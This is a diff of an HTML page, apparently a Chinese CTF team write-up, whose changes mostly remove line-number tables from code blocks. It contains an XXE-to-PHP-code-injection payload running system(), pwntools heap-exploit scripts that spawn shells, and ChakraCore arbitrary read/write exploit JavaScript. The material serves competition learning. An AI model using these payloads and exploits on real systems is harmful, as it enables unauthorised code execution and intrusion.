 </span></span></span><span class="line"><span class="cl"><span class="err">&lt;/div&gt;
 </span></span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php include(&#39;package/footer.php&#39;) ?&gt;
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>可以看到<code>usort($data, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));</code>，可以进行代码注入，
+</span></span></span></code></pre></div><p>可以看到<code>usort($data, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));</code>，可以进行代码注入，
 在xxe中构造<code>php://filter/convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=http%3A%2F%2F122.112.199.14%2Fexample&amp;order=id%2Cid)%3B%7D%3Bdie(system('ls%20-la%20%2F'))%3B%2F*</code>，直接用<code>system</code>执行列目录就行，在<code>/flag_eb8ba2eb07702e69963a7d6ab8669134</code>拿到 flag</p>
 <h2 id="pwn">Pwn</h2>
 <h3 id="note_five">note_five</h3>
 <p>unsortedbin attack and fastbin attack</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span><span class="lnt">83
-</span><span class="lnt">84
-</span><span class="lnt">85
-</span><span class="lnt">86
-</span><span class="lnt">87
-</span><span class="lnt">88
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./note_five&#34;</span><span class="p">)</span>
@@ -1295,124 +777,9 @@ index.php</p>
 </span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">21</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_createress</span><span class="o">+</span><span class="mh">0x4526a</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;__libc_realloc&#34;</span><span class="p">]</span><span class="o">+</span><span class="mi">13</span><span class="o">+</span><span class="n">libc_createress</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="vip">vip</h3>
+</span></span></code></pre></div><h3 id="vip">vip</h3>
 <p>利用随机数爆破fd 改指针使得可以edit 然后攻击list getshell。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">#context.log_level = &#34;debug&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#34;./vip&#34;)</span>
@@ -1521,71 +888,9 @@ index.php</p>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="mheap">mheap</h3>
+</span></span></code></pre></div><h3 id="mheap">mheap</h3>
 <p>read 的时候会出错向上写单链表指针控制list</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#34;./mheap&#34;)</span>
@@ -1641,51 +946,8 @@ index.php</p>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">rl</span><span class="p">(</span><span class="s2">&#34;choice: &#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sl</span><span class="p">(</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="mulnote">mulnote</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+</span></span></code></pre></div><h3 id="mulnote">mulnote</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
 </span></span><span class="line"><span class="cl">context.arch = &#34;amd64&#34;
 </span></span><span class="line"><span class="cl">libc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)
 </span></span><span class="line"><span class="cl">def c(size,data):
@@ -1722,39 +984,11 @@ index.php</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">#gdb.attach(io)
 </span></span><span class="line"><span class="cl">io.interactive()
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="childjs">childjs</h3>
+</span></span></code></pre></div><h3 id="childjs">childjs</h3>
 <p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1702">PoC和解析</a>
 真·面向CVE做题</p>
 <p>任意地址读</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function opt(o, proto, value) {
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function opt(o, proto, value) {
 </span></span><span class="line"><span class="cl">    o.b = 1;
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    let tmp = {__proto__: proto};
@@ -1776,93 +1010,8 @@ index.php</p>
 </span></span><span class="line"><span class="cl">}
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">main();
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>任意地址写</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">obj</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span></code></pre></div><p>任意地址写</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">obj</span> <span class="o">=</span> <span class="p">{}</span>
 </span></span><span class="line"><span class="cl"><span class="n">obj</span><span class="o">.</span><span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="n">obj</span><span class="o">.</span><span class="n">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="n">obj</span><span class="o">.</span><span class="n">c</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
@@ -1941,44 +1090,11 @@ index.php</p>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">();</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>用这个安全客的脚本修改一下libChakraCore的got表就完事儿了，NX没开，got中的<code>resolve</code>指向bss，跑个shellcode，搞定</p>
+</span></span></code></pre></div><p>用这个安全客的脚本修改一下libChakraCore的got表就完事儿了，NX没开，got中的<code>resolve</code>指向bss，跑个shellcode，搞定</p>
 <h2 id="misc">Misc</h2>
 <h3 id="jigsaw">jigsaw</h3>
 <p>纯拼图，按照时间排下序完事了</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># coding=utf-8</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># coding=utf-8</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
 </span></span><span class="line"><span class="cl">
@@ -2005,47 +1121,9 @@ index.php</p>
 </span></span><span class="line"><span class="cl">            <span class="n">target</span><span class="o">.</span><span class="n">paste</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="p">(</span><span class="n">width</span><span class="o">*</span><span class="n">col</span><span class="p">,</span> <span class="n">height</span><span class="o">*</span><span class="p">(</span><span class="n">i</span><span class="o">//</span><span class="n">column</span><span class="p">),</span> 
 </span></span><span class="line"><span class="cl">                                 <span class="n">width</span><span class="o">*</span><span class="p">(</span><span class="n">col</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="n">height</span><span class="o">*</span><span class="p">(</span><span class="n">i</span><span class="o">//</span><span class="n">column</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)))</span>   
 </span></span><span class="line"><span class="cl"><span class="n">target</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>拿到flag <img src="https://hackmd.summershrimp.com/uploads/upload_f47c3d040ed16a129a345190d1caa97d.png" alt=""></p>
+</span></span></code></pre></div><p>拿到flag <img src="https://hackmd.summershrimp.com/uploads/upload_f47c3d040ed16a129a345190d1caa97d.png" alt=""></p>
 <h3 id="betgame">betgame</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;DEBUG&#39;</span>
@@ -2077,33 +1155,11 @@ index.php</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">	<span class="n">sjb</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="crypto">Crypto</h2>
+</span></span></code></pre></div><h2 id="crypto">Crypto</h2>
 <h3 id="lrlr">lrlr</h3>
 <p>大致思路就是伪随机预测+rsa的低指数广播攻击</p>
 <p>MTRecover得到了所有的key</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">MTRecover</span> <span class="kn">import</span> <span class="n">MT19937Recover</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;old&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
@@ -2119,45 +1175,8 @@ index.php</p>
 </span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">72</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">	<span class="n">next_rand</span> <span class="o">=</span> <span class="n">rand</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">	<span class="nb">print</span> <span class="n">next_rand</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>根据key解密aes</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">getPrime</span><span class="p">,</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">long_to_bytes</span>
+</span></span></code></pre></div><p>根据key解密aes</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">getPrime</span><span class="p">,</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">long_to_bytes</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">stateconvert</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">text</span><span class="p">):</span>
@@ -2188,46 +1207,8 @@ index.php</p>
 </span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tmp2</span><span class="p">:</span>
